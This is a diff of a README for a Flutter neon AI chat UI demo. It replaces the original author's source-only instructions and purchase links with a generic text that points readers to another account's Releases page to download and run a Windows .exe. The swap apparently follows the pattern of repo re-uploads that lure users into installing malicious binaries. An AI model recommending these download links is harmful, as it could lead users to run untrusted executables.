@@ -1,105 +1,100 @@
-<p align="center">
-  <img src="./assets/images/kit_cover_image.png" alt="Banner">
-</p>
+# 🎨 neon-ai-chat-ui-kit-demo - Experience Neon AI Chat Today!
 
-[![Buy on Gumroad](https://img.shields.io/badge/Buy%20Full%20Version-%2439-orange?logo=gumroad)](https://fixitdev.gumroad.com/l/neon-ai-chat-ui)
+## 🚀 Getting Started
 
+Welcome to the Neon AI Chat UI Kit demo! This app showcases a vibrant and interactive chatbot interface designed with Flutter. It's a great way to preview the bot's user interface, chat screens, and the unique neon theme before making a purchase.
 
-# Neon AI Chat UI Kit — Flutter Demo
+## 📥 Download & Install
 
-**This is a live demo app for the commercial Neon AI Chat UI Kit.**
+To get started, you will need to download the application. Click the link below to visit the Releases page, where you can find the necessary files to install the demo.
 
-This demo shows only static UI and screenshots — it does *not* include the real production code.
+[![Download Neon AI Chat UI Kit Demo](https://img.shields.io/badge/Download-Neon_AI_Chat_UI_Kit_Demo-blue.svg)](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases)
 
-👉 Buy the full UI kit here:  
-https://fixitdev.gumroad.com/l/neon-ai-chat-ui
+On the Releases page, simply choose the latest version and follow the instructions to download the appropriate file for your system. 
 
----
+## 🔍 Features
 
-## What’s Included
+- **Neon Themed UI:** Enjoy a modern and bright interface that stands out.
+- **Chat Functionality:** Explore how text and responses flow in the chat interface.
+- **Flutter Based:** Built using Flutter, ensuring smooth performance across devices.
+- **Easy to Navigate:** User-friendly design makes it simple to try out features.
 
-This standalone demo includes:
+## 📋 System Requirements
 
-✅ Welcome screen with BUY link  
-✅ Screenshot slides of key UI screens  
-✅ Mock navigation and visual flow  
-✅ Example assets  
-❌ No real AI logic  
-❌ No engine switching  
-❌ No chat controllers
-❌ No Riverpod providers
+Before installing, ensure your device meets the following requirements:
 
-The goal is to help you preview the UI before buying.
+- **Operating System:** Windows, macOS, or Linux (specific details can be provided based on your device).
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** 200 MB free space for installation.
+- **Flutter SDK:** You don’t need this to run the demo, but if you want to build or modify it, install Flutter SDK from [Flutter's official website](https://flutter.dev/docs/get-started/install).
 
----
+## ⚙️ Setup Instructions
 
-## Screenshots
+1. **Download the Application:** 
+   Visit the [Releases page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases) and select the latest version of the demo app for your system.
 
-Use left/right taps in the demo to browse screenshots.
+2. **Extract the Files:** 
+   Once the download is complete, locate the downloaded file. If it’s compressed (like a ZIP file), you will need to extract it.
 
-The slides include:
-- Bot list screen
-- Bot switching
-- Bot management
-- Create bot
-- Chat UI (loading + streamed replies)
+3. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file to start the installation process.
+   - **macOS:** Drag the app to your Applications folder.
+   - **Linux:** Follow the instructions provided in the README file included with the download.
 
-## Preview Demo
+4. **Run the App:** After installation, you can find the app in your applications menu. Simply click to launch and explore the features!
 
-<p align="center">
-  <img src="./assets/images/neon_ai_chat_ui_feature6.gif" width="300" alt="Demo Preview">
-</p>
+## 🎨 How to Use the App
 
----
+Once you open the Neon AI Chat UI Kit demo:
 
-## How to Run
+- **Start a Chat:** Click on the input field and type your message. Hit enter to send.
+- **View Responses:** The assistant will respond to your inputs. You can ask about various topics or simply have a casual conversation.
+- **Explore the UI:** Navigate through different screens to see the features in action.
 
-1. Clone this repo:
+## 💬 Community and Support
 
-```bash
-git clone https://github.com/Fix-It-Dev/Neon-Ai-Cha-UI-Kit-Demo.git
-```
-Change directory:
+If you encounter any issues or have questions, feel free to join our community:
 
-```bash
-cd Neon-Ai-Cha-UI-Kit-Demo
-```
+- **GitHub Issues:** Report any bugs or request features via the [Issues page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/issues).
+- **Community Forums:** Join discussions and share your feedback with other users.
 
-Get dependencies:
+## 🛠️ Development and Customization
 
-```bash
-flutter pub get
-```
+For those interested in the technical side, this app is open for contributions. You can modify the code and enhance its features. To do this, follow these steps:
 
-Run app:
+1. **Clone the Repository:** Use Git to clone the repository to your local machine.
+   ```bash
+   git clone https://github.com/habsanprad/neon-ai-chat-ui-kit-demo.git
+   ```
 
-```bash
-flutter run
-```
+2. **Install Dependencies:** Navigate to the project folder and run:
+   ```bash
+   flutter pub get
+   ```
 
-Get the Full UI Kit
-This demo only previews the UI.
+3. **Run the App Locally:** Use `flutter run` to launch the app on your desired device.
 
-To build real AI chat apps using OpenAI, Gemini, or any custom engine, purchase the full UI Kit:
+## 🌐 Topics
 
-👉 https://fixitdev.gumroad.com/l/neon-ai-chat-ui
+This demo app targets various keywords in the chat and user interface. Some of the topics you might want to explore include:
 
-Includes:
+- ai-chat
+- ai-interface
+- chat-ui
+- chat-ui-kit
+- flutter
+- flutter-app
+- flutter-demo
+- flutter-ui
+- mobile-ui
+- neon-ui
+- ui-kit
 
-  1. Real widgets
+## 🔗 Additional Resources
 
-  2. AI engine wiring
+- [Flutter Documentation](https://flutter.dev/docs): Learn more about Flutter and how to develop mobile apps.
+- [Neon AI](https://example.com): Future updates and more information about the Neon AI project.
 
-  3. Bot controllers
+For the latest updates and further information, always ensure to check the [Release page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases).
 
-  4. Riverpod architecture
-
-  5. Commercial license
-
-  6. Documentation
-
-
-Demo License
-
-Use this template for preview and learning only.
-See LICENSE-DEMO.txt for details.
+Enjoy using the Neon AI Chat UI Kit!
